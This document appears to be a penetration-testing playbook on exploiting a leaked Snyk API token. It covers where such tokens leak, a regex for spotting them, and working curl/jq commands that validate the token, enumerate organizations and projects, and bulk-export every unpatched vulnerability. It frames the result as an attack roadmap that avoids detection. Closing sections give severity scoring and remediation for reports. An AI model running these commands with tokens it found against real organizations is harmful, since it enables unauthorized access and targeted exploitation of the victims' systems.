# Snyk Token Enumeration & Exploitation

When a Snyk API token is discovered (heapdump, JS files, GitHub Actions secrets, CI/CD configs), it provides a complete vulnerability roadmap for the target organization.

## Token Sources

| Source | Extraction Method |
|--------|------------------|
| Heapdump (Spring Boot) | Eclipse MAT → search for `SNYK_TOKEN` in Environment objects |
| JavaScript bundles | Regex: `snyk[_-]?token['":\s]*([a-f0-9-]{36})` |
| GitHub Actions | Repository secrets leaked via `github-actions-sa` or workflow logs |
| `.env` files | Direct exposure via path traversal or misconfigured static serving |
| CI/CD configs | Jenkins, GitLab CI, CircleCI environment variables |

## Validation

```bash
# Test if token is valid
curl -s -H "Authorization: token $SNYK_TOKEN" \
  "https://api.snyk.io/rest/self" | jq .
```

**Response if valid:** Returns user/service account info including org memberships.

## Enumeration

### List organizations

```bash
curl -s -H "Authorization: token $SNYK_TOKEN" \
  "https://api.snyk.io/rest/orgs?version=2024-04-22" | jq '.data[].attributes.name'
```

### List all projects (repos) in an org

```bash
ORG_ID="<org-uuid>"
curl -s -H "Authorization: token $SNYK_TOKEN" \
  "https://api.snyk.io/rest/orgs/$ORG_ID/projects?version=2024-04-22&limit=100" | \
  jq '.data[] | {name: .attributes.name, type: .attributes.type, origin: .attributes.origin}'
```

### Get all vulnerabilities for a project

```bash
PROJECT_ID="<project-uuid>"
curl -s -H "Authorization: token $SNYK_TOKEN" \
  "https://api.snyk.io/rest/orgs/$ORG_ID/issues?version=2024-04-22&project_id=$PROJECT_ID&limit=100" | \
  jq '.data[] | {title: .attributes.title, severity: .attributes.effective_severity_level, status: .attributes.status}'
```

### Bulk export (all issues across all projects)

```bash
# Get all issues for the org (paginated)
NEXT_URL="https://api.snyk.io/rest/orgs/$ORG_ID/issues?version=2024-04-22&limit=100"
while [ "$NEXT_URL" != "null" ] && [ -n "$NEXT_URL" ]; do
  resp=$(curl -s -H "Authorization: token $SNYK_TOKEN" "$NEXT_URL")
  echo "$resp" >> snyk-enum-data.json
  NEXT_URL=$(echo "$resp" | jq -r '.links.next // "null"')
done
```

## Intelligence Value

What an attacker gains from Snyk enumeration:

| Data | Attack Value |
|------|-------------|
| Repository names | Full list of all codebases (tech stack, naming conventions) |
| Dependency versions | Know exactly which libraries are in use and their versions |
| Unpatched CVEs | Prioritized list of exploitable vulnerabilities with severity |
| Fix availability | Know which vulns have patches (target the ones without) |
| Project types (npm, maven, pip) | Confirm tech stack for targeted exploitation |
| Issue status (open/resolved) | Know which vulns are still live vs already fixed |

## Attack Chain

```
Heapdump/JS/CI → Snyk Token → Org Enumeration → Project List → Vulnerability DB
                                                                      ↓
                                                    Targeted exploitation of known CVEs
                                                    (skip scanning — you already have the list)
```

## Findings Documentation

**Severity:** Critical (CVSS 8.5-9.0)
- Confidentiality: HIGH (full vulnerability database exposed)
- Integrity: NONE (read-only access unless token has admin scope)
- Availability: NONE

**CVSS Vector:** `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` (if token found without auth)

**Impact statement:** "An attacker with the Snyk API token can enumerate all {N} repositories, their technology stacks, and every known unpatched vulnerability. This provides a complete roadmap for exploitation — the attacker knows exactly which CVEs to target without performing any scanning that might trigger alerts."

## Remediation

1. **Immediate:** Revoke the exposed Snyk token
2. **Short-term:** Rotate all Snyk tokens across CI/CD pipelines
3. **Medium-term:** Use Snyk service accounts with minimum required permissions (read-only per project, not org-wide)
4. **Long-term:** Store Snyk tokens in secret managers (Vault, AWS Secrets Manager), never in environment variables or heapdumps

## Pitfalls

- Snyk API has rate limits (~1500 requests/hour for free tier, higher for paid)
- Token may be scoped to specific orgs — enumerate all accessible orgs first
- Some tokens are "service account" tokens with broader access than user tokens
- Snyk v1 API (`https://snyk.io/api/v1/`) is deprecated but may still work with older tokens
- The REST API (`/rest/`) requires `version` query parameter (date format: `2024-04-22`)
- Large orgs may have 100+ projects — use pagination (`limit` + `starting_after`)
